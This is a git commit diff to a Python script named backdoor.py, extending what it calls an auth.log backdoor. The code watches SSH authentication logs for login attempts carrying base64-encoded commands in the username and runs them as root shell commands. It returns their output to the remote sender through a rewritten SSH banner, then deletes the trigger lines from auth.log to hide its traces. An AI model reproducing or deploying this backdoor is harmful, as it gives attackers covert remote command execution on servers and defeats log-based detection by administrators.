c6f1368312cc87a375ad574d91dffe5bb9f34d59
Dennis <dtran331@gmail.com>
2019-01-26 19:19:45 -0800

    Added more function to shadowgh0st's auth.log backdoor. Added command output via ssh banners and a lot more debugging output. The output is stored in a banner file on a tmpfs mount. There is some commented out code that needs to be cleaned up.

--- backdoor.py
+++ backdoor.py
@@ -5,10 +5,23 @@ import time
 import binascii
 import subprocess
 
+
+ipcheck = "1.1.1.1"
+# counter keeps track of whether or not the previous stdout changes should be cleaned up
+counter = 0
 while True:
     for line in open("/var/log/auth.log"):
         try:
+            # if it is not the first connection. Should implement cleanup when script is quit
+            #if "shadow---" in line and counter > 0:
+            #    print(counter)
+            #    subprocess.call("rm", "-rf", "/tmp/tmpfs/*")
+            #    subprocess.call("umount", "/tmp/tmpfs/")
+            #    subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
+            #    subprocess.check_output("systemctl restart sshd, shell=True")
+
             if "shadow---" in line:
+                print(counter)
                 a,b = line.split("---")
                 array1 = b.split("from")
                 presortip = array1[1]
@@ -23,12 +36,47 @@ while True:
                     base64.decodestring(base64string)
                     decodedcmd = base64.b64decode(base64string)
                     cmd = subprocess.check_output(decodedcmd, shell=True);
+                    print(cmd + "THIS IS WHEN IT'S FIRST EXECUTED")
                 except binascii.Error:
                     pass
+                # after the command is sent, create tmp filesystem
+                try: 
+                    subprocess.check_output("mkdir /tmp/tmpfs", shell=True)
+                    print("created dir for tmpfs")
+                except subprocess.CalledProcessError as e:
+                    pass
+                time.sleep(1)
+                subprocess.check_output("mount -t tmpfs -o size=64m tmpfs /tmp/tmpfs", shell=True)
+                print("mounted tmpfs")
+                # create new file in tmpfs and write command
+                tmpIssue = open("/tmp/tmpfs/issue.net", 'w') 
+                print("opened issue.net")
+                time.sleep(2)
+                tmpIssue.write(cmd)
+                tmpIssue.close()
+                print("wrote to issue.net the output")
+                time.sleep(2)
+                # modify sshd_config and restart sshd to apply changes
+                subprocess.check_output("sed -i 's:#Banner none:Banner /tmp/tmpfs/issue.net:g' /etc/ssh/sshd_config", shell=True)
+                print("rewrote sshd_config")
+                time.sleep(2)
+                subprocess.call("systemctl restart sshd", shell=True)
+                print("restarting sshd")
+                time.sleep(10)
+                # cleanup. Further connections will show the output until command reset
+                subprocess.call("rm", "-rf", "/tmp/tmpfs/*")
+                subprocess.call("umount", "/tmp/tmpfs/")
+                subprocess.check_output("sed -i 's:Banner /tmp/tmpfs/issue.net:Banner none:g'", shell=True)
+
+                
+
+
+
         except IndexError:
             pass
     if "shadow---" in line:
         subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
         subprocess.check_output("/etc/init.d/rsyslog restart", shell=True);
+        subprocess.check_output("systemctl restart sshd, shell=True")
         #restart syslog cuz for soem reason it crashes on debian after txt manipulation, temp fix untill better solution is found.
     time.sleep(1)
